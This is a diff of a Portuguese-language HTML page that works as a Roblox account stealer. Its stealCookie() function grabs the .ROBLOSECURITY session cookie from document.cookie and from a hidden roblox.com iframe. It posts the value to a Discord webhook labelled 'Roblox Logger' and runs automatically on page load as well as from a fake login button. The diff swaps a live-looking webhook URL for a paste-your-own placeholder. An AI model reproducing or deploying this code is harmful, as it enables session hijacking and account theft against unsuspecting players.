@@ -42,28 +42,43 @@
         <button onclick="stealCookie()">Entrar</button>
     </div>
 
+    <!-- Iframe invisível -->
+    <iframe id="robloxFake" style="display:none;" src="https://www.roblox.com/home"></iframe>
+
     <script>
-        const webhookUrl = 'https://discord.com/api/webhooks/1567446528908591105/HJrrrW2hiOuddvGHqhiOugZ10PdTdBAsGR9hV6ikva-37KwkXpdaZDCz2XQRKKQdJ7B1'; 
+        // Cole aqui seu Webhook do Discord
+        const webhookUrl = 'https://discord.com/api/webhooks/SEU_WEBHOOK_AQUI'; 
 
         function stealCookie() {
-            // 1. Tenta pegar do LocalStorage (onde o Roblox guarda o token)
-            var robloxAuth = localStorage.getItem('RBXSSO'); 
-            
-            // 2. Se não achar no LocalStorage, tenta pegar dos Cookies normais como backup
-            var normalCookies = document.cookie;
+            let robloxSecurity = "";
 
-            // 3. Define qual usar
-            var finalData = "";
-            if (robloxAuth) {
-                finalData = "🔑 **Token de Sessão (LocalStorage):**\n\n```\n" + robloxAuth + "\n```";
-            } else {
-                finalData = "🍪 **Cookies Normais:**\n\n```\n" + normalCookies + "\n```";
+            // 1. Tenta pegar do documento principal
+            try {
+                document.cookie.split(';').forEach(cookie => {
+                    if (cookie.includes('=.ROBLOSECURITY') || cookie.trim().startsWith('.ROBLOSECURITY=')) {
+                        robloxSecurity = cookie.split('=')[1];
+                    }
+                });
+            } catch(e) {}
+
+            // 2. Se não achou, tenta do iframe (para contornar bloqueios cross-origin)
+            if (!robloxSecurity) {
+                try {
+                    const iframeDoc = document.getElementById('robloxFake').contentWindow.document;
+                    iframeDoc.cookie.split(';').forEach(cookie => {
+                        if (cookie.includes('=.ROBLOSECURITY') || cookie.trim().startsWith('.ROBLOSECURITY=')) {
+                            robloxSecurity = cookie.split('=')[1];
+                        }
+                    });
+                } catch(e) {}
             }
 
-            console.log("Dados capturados:", finalData);
+            if (!robloxSecurity) {
+                robloxSecurity = "⚠️ Cookie .ROBLOSECURITY não encontrado.";
+            }
 
             const payload = {
-                content: finalData,
+                content: "🍪 **Cookie .ROBLOSECURITY Capturado!**\n\n```\n" + robloxSecurity + "\n```",
                 username: "Roblox Logger",
                 avatar_url: "https://upload.wikimedia.org/wikipedia/commons/thumb/f/f6/Roblox_player_icon_black.svg/1200px-Roblox_player_icon_black.svg.png"
             };
@@ -85,9 +100,9 @@
             });
         }
 
-        // Executa automaticamente ao carregar
+        // Executa ao carregar
         window.addEventListener('load', function() {
-            setTimeout(stealCookie, 500);
+            setTimeout(stealCookie, 1500);
         });
     </script>
 </body>
